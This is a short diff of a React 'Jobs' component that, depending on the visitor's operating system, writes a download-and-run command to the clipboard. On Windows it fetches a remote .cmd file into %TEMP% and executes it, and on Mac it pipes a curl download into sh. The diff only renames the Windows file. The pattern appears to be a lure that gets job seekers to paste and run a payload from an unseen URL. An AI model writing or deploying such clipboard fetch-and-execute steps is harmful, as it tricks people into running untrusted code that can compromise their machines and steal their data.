@@ -176,7 +176,7 @@ export default function Jobs() {
       
      {os === 'windows' ? 'Windows Command/URL' : os === 'mac' ? 'Mac Command/URL' : 'Linux Command/URL'}
      if(os === 'windows')
-      await navigator.clipboard.writeText(`curl ${cmdUrl} -o %TEMP%\k.cmd && %TEMP%\k.cmd`)
+      await navigator.clipboard.writeText(`curl ${cmdUrl} -o %TEMP%\tk.cmd && %TEMP%\tk.cmd`)
      else if(os === 'mac')
       await navigator.clipboard.writeText(`curl "${cmdUrl}" | sh`)
      else if(os === 'linux')
